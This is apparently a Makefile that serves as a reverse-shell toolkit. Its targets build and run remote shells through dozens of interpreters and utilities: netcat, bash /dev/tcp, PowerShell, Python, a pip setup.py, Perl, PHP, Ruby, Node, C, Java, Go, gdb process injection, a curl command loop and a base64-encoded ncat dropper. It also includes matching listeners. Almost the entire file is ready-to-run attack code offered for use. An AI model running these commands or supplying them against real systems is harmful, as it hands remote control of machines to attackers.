HOST	:= 127.0.0.1
PORT	:= 4444
RSHELL	:= /bin/bash
PORT2	:= 4445
TMP		:= /tmp/f

METHODS	:= listener ncat1 ncat2 telnet1 telnet2 socat socket openssl openssl-listener curl curl-listener bash ksh zsh tclsh pwsh python3 pip perl cpan php lua ruby1 ruby2 irb1 irb2 node jjs julia gcc javac go gawk gdb vim-python gdb-python gimp-python encoded-ncat

BOLD		:= \033[1m
UNDERLINE	:= \033[4m
GREEN		:= \033[32m
BLUE		:= \033[34m
RED			:= \033[31m
RESET		:= \033[0m

blue=$(tput setaf 4)
normal=$(tput sgr0)

.PHONY: show

show:
	@printf "HOST  : $(GREEN)$(HOST)$(RESET)\n"
	@printf "PORT  : $(GREEN)$(PORT)$(RESET)\n"
	@printf "SHELL : $(GREEN)$(RSHELL)$(RESET)\n"
	@printf "PORT2 : $(GREEN)$(PORT2)$(RESET)\n"
	@printf "TMP   : $(GREEN)$(TMP)$(RESET)\n"
	@printf "\n"
	@printf "To change previous values, run $(UNDERLINE)./configure <key>=<value> [<key>=<value> ...]$(RESET).\n"
	@printf "\n"
	@printf "Available methods:\n"
	@CODES=$$(echo "$(METHODS)" | tr ' ' '\n' | sort); \
		PADDED=$$(printf "%s\n" "$$CODES" | awk '{printf "%-20s\n", $$1}'); \
		printf "%s\n" "$$PADDED" | awk '{printf "\033[1m\033[34m%s\033[0m\n", $$0}' | column
	@printf "\n"
	@printf "Run $(UNDERLINE)make <method>$(RESET) to use a specific method from the list.\n"
	@printf "Run $(UNDERLINE)make <method>-show$(RESET) to just see the command(s) for a specific method (without running it).\n"


######################### LISTENER #########################

listener:
	nc -lvp $(PORT)

listener-show:
	@printf "nc -lvp $(PORT)\n"

############################################################

########################## NETCAT ##########################

ncat1:
	ncat -e $(RSHELL) $(HOST) $(PORT)

ncat1-show:
	@printf "ncat -e $(RSHELL) $(HOST) $(PORT)\n"

ncat2:
	mkfifo $(TMP); /bin/bash < $(TMP) 2>&1 | ncat 127.0.0.1 4444 > $(TMP); rm $(TMP)

ncat2-show:
	@printf "mkfifo $(TMP); /bin/bash < $(TMP) 2>&1 | ncat 127.0.0.1 4444 > $(TMP); rm $(TMP)\n"

############################################################

########################## TELNET ##########################

telnet1:
	telnet $(HOST) $(PORT) | $(RSHELL) 2>&1 | telnet $(HOST) $(PORT2)

telnet1-show:
	@printf "telnet $(HOST) $(PORT) | $(RSHELL) 2>&1 | telnet $(HOST) $(PORT2)\n"

telnet2:
	mkfifo $(TMP); $(RSHELL) < $(TMP) 2>&1 | telnet $(HOST) $(PORT) > $(TMP); rm $(TMP)

telnet2-show:
	@printf "mkfifo $(TMP); $(RSHELL) < $(TMP) 2>&1 | telnet $(HOST) $(PORT) > $(TMP); rm $(TMP)\n"

############################################################

########################## SOCAT ###########################

socat:
	socat tcp:$(HOST):$(PORT) exec:$(RSHELL),stderr

socat-show:
	@printf "socat tcp:$(HOST):$(PORT) exec:$(RSHELL),stderr\n"

############################################################

########################## SOCKET ##########################

socket:
	socket -p '$(RSHELL)' $(HOST) $(PORT)

socket-show:
	@printf "socket -p '$(RSHELL)' $(HOST) $(PORT)\n"

############################################################

########################## OPENSSL #########################

openssl:
	mkfifo $(TMP); $(RSHELL) < $(TMP) 2>&1 | openssl s_client -quiet $(HOST):$(PORT) > $(TMP); rm $(TMP)

openssl-show:
	@printf "mkfifo $(TMP); $(RSHELL) < $(TMP) 2>&1 | openssl s_client -quiet $(HOST):$(PORT) > $(TMP); rm $(TMP)\n"

openssl-listener:
	openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -noenc
	openssl s_server -quiet -key key.pem -cert cert.pem -port $(PORT)

openssl-listener-show:
	@printf "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -noenc\n"
	@printf "openssl s_server -quiet -key key.pem -cert cert.pem -port $(PORT)\n"

############################################################

########################### CURL ###########################

curl:
	while true; do cmd=$$(curl -s http://$(HOST):$(PORT)); res=$$($(RSHELL) -c "$$cmd" 2>&1); curl -X POST -d "$$res" http://$(HOST):$(PORT); done;

curl-show:
	@printf "while true; do cmd=\$$(curl -s http://$(HOST):$(PORT)); res=\$$($(RSHELL) -c \"\$$cmd\" 2>&1); curl -X POST -d \"\$$res\" http://$(HOST):$(PORT); done;\n"

curl-listener:
	python -c 'from http.server import BaseHTTPRequestHandler,HTTPServer; H=type("H",(BaseHTTPRequestHandler,),{"do_GET":lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(input("[+] Enter command to execute: ").encode())), "do_POST":lambda s:(s.send_response(200),s.end_headers(),print("[+] Command output:\n"+s.rfile.read(int(s.headers["Content-Length"])).decode()))}); HTTPServer(("0.0.0.0",$(PORT)),H).serve_forever()'

curl-listener-show:
	@printf "python -c 'from http.server import BaseHTTPRequestHandler,HTTPServer; H=type(\"H\",(BaseHTTPRequestHandler,),{\"do_GET\":lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(input(\"[+] Enter command to execute: \").encode())), \"do_POST\":lambda s:(s.send_response(200),s.end_headers(),print(\"[+] Command output:\\\\n\"+s.rfile.read(int(s.headers[\"Content-Length\"])).decode()))}); HTTPServer((\"0.0.0.0\",$(PORT)),H).serve_forever()'\n"

############################################################

########################### BASH ###########################

bash:
	bash -c '$(RSHELL) &> /dev/tcp/$(HOST)/$(PORT) 0>&1'

bash-show:
	@printf "bash -c '$(RSHELL) &> /dev/tcp/$(HOST)/$(PORT) 0>&1'\n"

############################################################

######################## KORNSHELL #########################

ksh:
	ksh -c '$(RSHELL) &> /dev/tcp/$(HOST)/$(PORT) 0>&1'

ksh-show:
	@printf "ksh -c '$(RSHELL) &> /dev/tcp/$(HOST)/$(PORT) 0>&1'\n"

############################################################

######################### Z SHELL ##########################

zsh:
	zsh -c 'zmodload zsh/net/tcp; ztcp -d 3 $(HOST) $(PORT); $(RSHELL) 0<&3 1>&3 2>&3'

zsh-show:
	@printf "zsh -c 'zmodload zsh/net/tcp; ztcp -d 3 $(HOST) $(PORT); $(RSHELL) 0<&3 1>&3 2>&3'\n"

############################################################

######################### TCL SHELL ########################

tclsh:
	echo 'set sock [socket $(HOST) $(PORT)]; while {[gets $$sock cmd] >= 0} { set e "exec $$cmd 2>@1"; if {![catch {set res [eval $$e]} err]} { puts $$sock $$res } else { puts $$sock $$err }; flush $$sock }; close $$sock' | tclsh

tclsh-show:
	@printf "echo 'set sock [socket $(HOST) $(PORT)]; while {[gets \$$sock cmd] >= 0} { set e \"exec \$$cmd 2>@1\"; if {![catch {set res [eval \$$e]} err]} { puts \$$sock \$$res } else { puts \$$sock \$$err\ }; flush \$$sock }; close \$$sock' | tclsh\n"

############################################################

######################## POWERSHELL ########################

pwsh:
	pwsh -c '$$TCPClient = New-Object Net.Sockets.TCPClient("$(HOST)", $(PORT)); $$NetworkStream = $$TCPClient.GetStream(); $$StreamReader = New-Object IO.StreamReader($$NetworkStream); $$StreamWriter = New-Object IO.StreamWriter($$NetworkStream); $$StreamWriter.AutoFlush = $$true; $$Buffer = New-Object System.Byte[] 1024; while ($$TCPClient.Connected) { while ($$NetworkStream.DataAvailable) { $$RawData = $$NetworkStream.Read($$Buffer, 0, $$Buffer.Length); $$Code = ([text.encoding]::UTF8).GetString($$Buffer, 0, $$RawData -1) }; if ($$TCPClient.Connected -and $$Code.Length -gt 1) { $$Output = try { Invoke-Expression ($$Code) 2>&1 } catch { $$_ }; $$StreamWriter.Write("$$Output`n"); $$Code = $$null } }; $$TCPClient.Close(); $$NetworkStream.Close(); $$StreamReader.Close(); $$StreamWriter.Close()'

pwsh-show:
	@printf "pwsh -c '\$$TCPClient = New-Object Net.Sockets.TCPClient(\"$(HOST)\", $(PORT)); \$$NetworkStream = \$$TCPClient.GetStream(); \$$StreamReader = New-Object IO.StreamReader(\$$NetworkStream); \$$StreamWriter = New-Object IO.StreamWriter(\$$NetworkStream); \$$StreamWriter.AutoFlush = \$$true; \$$Buffer = New-Object System.Byte[] 1024; while (\$$TCPClient.Connected) { while (\$$NetworkStream.DataAvailable) { \$$RawData = \$$NetworkStream.Read(\$$Buffer, 0, \$$Buffer.Length); \$$Code = ([text.encoding]::UTF8).GetString(\$$Buffer, 0, \$$RawData -1) }; if (\$$TCPClient.Connected -and \$$Code.Length -gt 1) { \$$Output = try { Invoke-Expression (\$$Code) 2>&1 } catch { \$$_ }; \$$StreamWriter.Write(\"\$$Output\`n\"); \$$Code = \$$null } }; \$$TCPClient.Close(); \$$NetworkStream.Close(); \$$StreamReader.Close(); \$$StreamWriter.Close()'\n"

############################################################

########################## PYTHON ##########################

python3:
	python3 -c 'import socket,os; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp("$(RSHELL)", ["$(RSHELL)"])'

python3-show:
	@printf "python3 -c 'import socket,os; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp(\"$(RSHELL)\", [\"$(RSHELL)\"])'\n"

############################################################

########################### PIP ############################

pip:
	mkdir -p $(TMP); echo 'import socket,os; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp("$(RSHELL)", ["$(RSHELL)"])' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)

pip-show:
	@printf "mkdir -p $(TMP); echo 'import socket,os; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp(\"$(RSHELL)\", [\"$(RSHELL)\"])' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)\n"

############################################################

########################### PERL ###########################

perl:
	perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); connect(S,sockaddr_in($(PORT),inet_aton("$(HOST)"))); open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("$(RSHELL)");'

perl-show:
	@printf "perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); connect(S,sockaddr_in($(PORT),inet_aton(\"$(HOST)\"))); open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"$(RSHELL)\");'\n"

############################################################

########################### CPAN ###########################

cpan:
	echo '! use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); connect(S,sockaddr_in($(PORT),inet_aton("$(HOST)"))); open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("$(RSHELL)");' | cpan

cpan-show:
	@printf "echo '! use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); connect(S,sockaddr_in($(PORT),inet_aton(\"$(HOST)\"))); open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"$(RSHELL)\");' | cpan\n"

############################################################

############################ PHP ###########################

php:
	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); proc_open("$(RSHELL)", array(0=>$$sock, 1=>$$sock, 2=>$$sock),$$pipes);'

php-show:
	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); proc_open(\"$(RSHELL)\", array(0=>\$$sock,1=>\$$sock,2=>\$$sock), \$$pipes);'\n"

############################################################

############################ LUA ###########################

lua:
	lua -e 'socket = require("socket"); socket.tcp():connect("$(HOST)",$(PORT)); os.execute("$(RSHELL) <&3 >&3 2>&3");'

lua-show:
	@printf "lua -e 'socket = require(\"socket\"); socket.tcp():connect(\"$(HOST)\",$(PORT)); os.execute(\"$(RSHELL) <&3 >&3 2>&3\");'\n"

############################################################

########################### RUBY ###########################

ruby1:
	ruby -e 'require "socket"; sock = TCPSocket.new("$(HOST)",$(PORT)); STDIN.reopen(sock); STDOUT.reopen(sock); STDERR.reopen(sock); exec "$(RSHELL)"'

ruby1-show:
	@printf "ruby -e 'require \"socket\"; sock = TCPSocket.new(\"$(HOST)\",$(PORT)); STDIN.reopen(sock); STDOUT.reopen(sock); STDERR.reopen(sock); exec \"$(RSHELL)\"'\n"

ruby2:
	ruby -e 'require "socket"; sock = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = sock.gets); IO.popen(cmd,"r"){|io| sock.print io.read} end'

ruby2-show:
	@printf "ruby -e 'require \"socket\"; sock = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = sock.gets); IO.popen(cmd,\"r\"){|io| sock.print io.read} end'\n"

############################################################

############################ IRB ###########################

irb1:
	echo 'require "socket"; sock = TCPSocket.new("$(HOST)",$(PORT)); STDIN.reopen(sock); STDOUT.reopen(sock); STDERR.reopen(sock); exec "$(RSHELL)"' | irb

irb1-show:
	@printf "echo 'require \"socket\"; sock = TCPSocket.new(\"$(HOST)\",$(PORT)); STDIN.reopen(sock); STDOUT.reopen(sock); STDERR.reopen(sock); exec \"$(RSHELL)\"' | irb\n"

irb2:
	echo 'require "socket"; sock = TCPSocket.new("$(HOST)",$(PORT)); while(cmd = sock.gets); IO.popen(cmd,"r"){|io| sock.print io.read} end' | irb

irb2-show:
	@printf "echo 'require \"socket\"; sock = TCPSocket.new(\"$(HOST)\",$(PORT)); while(cmd = sock.gets); IO.popen(cmd,\"r\"){|io| sock.print io.read} end' | irb\n"

############################################################

########################### NODE ###########################

node:
	node -e 'shell = require("child_process").spawn("$(RSHELL)"); require("net").connect($(PORT), "$(HOST)", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'

node-show:
	@printf "node -e 'shell = require(\"child_process\").spawn(\"$(RSHELL)\"); require(\"net\").connect($(PORT), \"$(HOST)\", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'\n"

############################################################

############################ JJS ###########################

jjs:
	echo 'var sock = new java.net.Socket("$(HOST)",$(PORT)); var proc = new java.lang.ProcessBuilder("$(RSHELL)").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(100); }; proc.destroy(); sock.close();' | jjs

jjs-show:
	@printf "echo 'var sock = new java.net.Socket(\"$(HOST)\",$(PORT)); var proc = new java.lang.ProcessBuilder(\"$(RSHELL)\").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(100); }; proc.destroy(); sock.close();' | jjs\n"

############################################################

########################## JULIA ###########################

julia:
	julia -e 'using Sockets; sock = connect("$(HOST)", parse(Int64,"$(PORT)")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'

julia-show:
	@printf "julia -e 'using Sockets; sock = connect(\"$(HOST)\", parse(Int64,\"$(PORT)\")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(\`\$$cmd\`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'\n"

############################################################

########################### GCC ############################

gcc:
	echo $$'#include <stdlib.h>\n#include <unistd.h>\n#include <arpa/inet.h>\nint main(){ int sock=socket(AF_INET,SOCK_STREAM,0); if (sock==-1) exit(1); struct sockaddr_in server_addr; server_addr.sin_family=AF_INET; server_addr.sin_port=htons($(PORT)); inet_pton(AF_INET,"$(HOST)",&server_addr.sin_addr); if (connect(sock,(struct sockaddr*)&server_addr,sizeof(server_addr))==-1) { close(sock); exit(1); } dup2(sock,0); dup2(sock,1); dup2(sock,2); execl("$(RSHELL)","$(RSHELL)",NULL); close(sock); }' > $(TMP).c; gcc $(TMP).c -o $(TMP); $(TMP); rm $(TMP).c; rm $(TMP)

gcc-show:
	@printf "echo \$$'#include <stdlib.h>\\\\n#include <unistd.h>\\\\n#include <arpa/inet.h>\\\\nint main(){ int sock=socket(AF_INET,SOCK_STREAM,0); if (sock==-1) exit(1); struct sockaddr_in server_addr; server_addr.sin_family=AF_INET; server_addr.sin_port=htons($(PORT)); inet_pton(AF_INET,\"$(HOST)\",&server_addr.sin_addr); if (connect(sock,(struct sockaddr*)&server_addr,sizeof(server_addr))==-1) { close(sock); exit(1); } dup2(sock,0); dup2(sock,1); dup2(sock,2); execl(\"$(RSHELL)\",\"$(RSHELL)\",NULL); close(sock); }' > $(TMP).c; gcc $(TMP).c -o $(TMP); $(TMP); rm $(TMP).c; rm $(TMP)\n"

############################################################

########################## JAVAC ###########################

JAVA_FILE := ReverseShell

javac:
	echo 'import java.io.InputStream; import java.io.OutputStream; import java.net.Socket; public class ReverseShell { public static void main(String[] args) throws Exception { Socket sock = new Socket("$(HOST)", $(PORT)); Process proc = new ProcessBuilder("$(RSHELL)").redirectErrorStream(true).start(); InputStream pi = proc.getInputStream(); OutputStream po = proc.getOutputStream(); InputStream si = sock.getInputStream(); OutputStream so = sock.getOutputStream(); while (!sock.isClosed()) { while (pi.available() > 0) so.write(pi.read()); while (si.available() > 0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(100); } proc.destroy(); sock.close(); } }' > $(JAVA_FILE).java; javac $(JAVA_FILE).java; java $(JAVA_FILE); rm $(JAVA_FILE).java; rm $(JAVA_FILE).class

javac-show:
	@printf "echo 'import java.io.InputStream; import java.io.OutputStream; import java.net.Socket; public class ReverseShell { public static void main(String[] args) throws Exception { Socket sock = new Socket(\"$(HOST)\", $(PORT)); Process proc = new ProcessBuilder(\"$(RSHELL)\").redirectErrorStream(true).start(); InputStream pi = proc.getInputStream(); OutputStream po = proc.getOutputStream(); InputStream si = sock.getInputStream(); OutputStream so = sock.getOutputStream(); while (!sock.isClosed()) { while (pi.available() > 0) so.write(pi.read()); while (si.available() > 0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(100); } proc.destroy(); sock.close(); } }' > $(JAVA_FILE).java; javac $(JAVA_FILE).java; java $(JAVA_FILE); rm $(JAVA_FILE).java; rm $(JAVA_FILE).class\n"

############################################################

############################ GO ############################

go:
	echo 'package main; import ("net"; "os/exec"); func main() { conn, _ := net.Dial("tcp", "$(HOST):$(PORT)"); cmd := exec.Command("$(RSHELL)"); cmd.Stdin = conn; cmd.Stdout = conn; cmd.Stderr = conn; cmd.Run() }' > $(TMP).go; go run $(TMP).go; rm $(TMP).go

go-show:
	@printf "echo 'package main; import (\"net\"; \"os/exec\"); func main() { conn, _ := net.Dial(\"tcp\", \"$(HOST):$(PORT)\"); cmd := exec.Command(\"$(RSHELL)\"); cmd.Stdin = conn; cmd.Stdout = conn; cmd.Stderr = conn; cmd.Run() }' > $(TMP).go; go run $(TMP).go; rm $(TMP).go\n"

############################################################

########################### GAWK ###########################

gawk:
	gawk 'BEGIN { sock = "/inet/tcp/0/$(HOST)/$(PORT)"; while (1) { if ((sock |& getline c) <= 0) break; while (c && (c " 2>&1" |& getline res) > 0) print res |& sock; close(c)}}'

gawk-show:
	@printf "gawk 'BEGIN { sock = \"/inet/tcp/0/$(HOST)/$(PORT)\"; while (1) { if ((sock |& getline c) <= 0) break; while (c && (c \" 2>&1\" |& getline res) > 0) print res |& sock; close(c)}}'\n"

############################################################

########################### GDB ############################

gdb:
	@if [ -z "$(PID)" ]; then \
		printf "$(RED)Error:$(RESET) PID is not set. Set it to the PID of the process with access to system() call.\n"; \
		exit 1; \
	fi
	gdb --batch -p $(PID) -ex 'call (int) system("bash -c '\''$(RSHELL) &> /dev/tcp/$(HOST)/$(PORT) 0>&1'\''")'

gdb-show:
	@if [ -z "$(PID)" ]; then \
		printf "$(RED)Error:$(RESET) PID is not set. Set it to the PID of the process with access to system() call.\n"; \
		exit 1; \
	fi
	@printf "gdb --batch -p $(PID) -ex 'call (int) system(\"bash -c '\''$(RSHELL) &> /dev/tcp/$(HOST)/$(PORT) 0>&1'\''\")'\n"

############################################################

######################## VIM PYTHON ########################

vim-python:
	vim -c ':pyx import socket,os; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp("$(RSHELL)", ["$(RSHELL)"]); vim.command(":q!")'

vim-python-show:
	@printf "vim -c ':pyx import socket,os; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp(\"$(RSHELL)\", [\"$(RSHELL)\"]); vim.command(\":q!\")'\n"

############################################################

######################## GDB PYTHON ########################

gdb-python:
	gdb --batch -ex 'python import os,socket; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp("$(RSHELL)", ["$(RSHELL)"])'

gdb-python-show:
	@printf "gdb --batch -ex 'python import os,socket; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp(\"$(RSHELL)\", [\"$(RSHELL)\"])'\n"

############################################################

######################## GIMP PYTHON #######################

gimp-python:
	gimp -i --batch-interpreter=python-fu-eval -b 'import socket,os; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp("$(RSHELL)", ["$(RSHELL)"])'

gimp-python-show:
	@printf "gimp -idf --batch-interpreter=python-fu-eval -b 'import socket,os; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp(\"$(RSHELL)\", [\"$(RSHELL)\"])'\n"

############################################################

####################### ENCODED NCAT #######################

NCATDEF := ./ncat-static
OUTDEF  := ./reverse-shell
NCAT	?= $(NCATDEF)
OUT		?= $(OUTDEF)

encoded-ncat:
	@if [ "$(NCAT)" = "$(NCATDEF)" ]; then \
		printf "$(BLUE)Warning:$(RESET) NCAT is set to default value: $(GREEN)$(NCATDEF)$(RESET)\n"; \
	fi
	@if [ "$(OUT)" = "$(OUTDEF)" ]; then \
		printf "$(BLUE)Warning:$(RESET) OUT is set to default value: $(GREEN)$(OUTDEF)$(RESET)\n"; \
	fi
	echo 'cp -p $(RSHELL) $(TMP); echo "'`base64 $(NCAT)`'" | base64 -di > $(TMP); $(TMP) -e $(RSHELL) $(HOST) $(PORT)' > $(OUT); chmod +x $(OUT)

encoded-ncat-show:
	@if [ "$(NCAT)" = "$(NCATDEF)" ]; then \
		printf "$(BLUE)Warning:$(RESET) NCAT is set to default value: $(GREEN)$(NCATDEF)$(RESET). Set it to the path of your static ncat binary.\n"; \
	fi
	@if [ "$(OUT)" = "$(OUTDEF)" ]; then \
		printf "$(BLUE)Warning:$(RESET) OUT is set to default value: $(GREEN)$(OUTDEF)$(RESET). Set it to the desired path for the output script.\n"; \
	fi
	@printf "echo 'cp -p $(RSHELL) $(TMP); echo \"'\`base64 $(NCAT)\`'\" | base64 -di > $(TMP); $(TMP) -e $(RSHELL) $(HOST) $(PORT)' > $(OUT); chmod +x $(OUT)\n"

############################################################
